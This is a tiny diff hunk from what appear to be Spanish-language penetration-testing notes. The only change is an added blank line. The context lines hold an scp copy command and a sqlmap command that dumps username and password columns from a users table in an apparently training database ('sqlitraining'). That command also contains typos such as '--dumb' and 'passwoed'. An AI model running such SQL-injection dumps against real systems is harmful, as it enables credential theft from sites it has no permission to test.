@@ -171,3 +171,4 @@ scp -r ''USER@IP:/ruta/* . * ruta donde queremos copiar(.)''
 ```python
 	sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users -C usarname,passwoed --dumb
 ```
+
